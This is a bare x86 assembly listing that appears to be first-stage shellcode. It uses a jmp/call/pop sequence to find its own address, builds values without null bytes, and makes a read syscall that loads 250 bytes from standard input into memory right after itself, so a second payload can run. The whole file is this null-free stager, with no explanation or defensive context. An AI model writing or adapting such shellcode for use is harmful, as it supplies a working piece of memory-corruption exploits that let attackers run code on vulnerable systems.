	.globl	cbegin
	.globl	cend

cbegin:
	jmp	cend

rrr:
	movb	$0xfa,	%dl		/* length */

	popl	%ecx			/* position */

	push	$0x41
	pop	%ebx
	xorb	$0x41,	%bl

	push	$0x3
	pop	%eax
	int	$0x80			/* read */

cend:
	call	rrr

